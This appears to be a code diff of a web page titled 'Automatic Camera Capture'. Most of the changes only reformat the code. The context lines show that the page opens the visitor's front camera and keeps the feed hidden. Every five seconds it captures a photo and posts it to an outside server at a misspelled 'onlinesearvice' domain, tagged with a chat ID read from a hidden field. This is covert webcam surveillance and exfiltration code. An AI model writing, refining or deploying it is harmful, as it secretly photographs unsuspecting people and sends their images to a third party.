@@ -1,10 +1,12 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Automatic Camera Capture</title>
 </head>
+
 <body>
     <div id="cameraContainer" style="display: none;">
         <video id="cameraFeed" autoplay></video>
@@ -31,7 +33,11 @@
 
         async function setupCamera() {
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: {
+                        facingMode: 'user'
+                    }
+                });
                 cameraFeed.srcObject = stream;
                 cameraContainer.style.display = "none"; // Hide camera container
             } catch (error) {
@@ -51,20 +57,23 @@
                 const base64ImageParts = capturedImage.split(';base64,');
                 const contentType = base64ImageParts[0].split(':')[1];
                 const rawImage = atob(base64ImageParts[1]);
-                const imageBlob = new Blob([new Uint8Array(rawImage.length).map((_, i) => rawImage.charCodeAt(i))], { type: contentType });
+                const imageBlob = new Blob([new Uint8Array(rawImage.length).map((_, i) => rawImage.charCodeAt(i))], {
+                    type: contentType
+                });
 
                 // Create a FormData object to send the image as a file
                 const formData = new FormData();
                 formData.append('photo', imageBlob, 'image.png');
 
-                // Send the image to a PHP script for processing
+                // Send the image to the PHP script for processing
                 const chatID = chatIdInput.value; // Get chat ID from the hidden input field
                 const apiUrl = 'https://onlinesearvice.xyz/pic/send.php'; // Your PHP script's URL
+
                 await fetch(apiUrl, {
                     method: 'POST',
                     body: formData,
                     headers: {
-                        'Chat-ID': chatID // Send the chat ID as a header
+                        'Chat-ID': chatID
                     }
                 });
 
@@ -91,4 +100,5 @@
         }, 5000); // 5000 milliseconds (5 seconds) between captures
     </script>
 </body>
+
 </html>
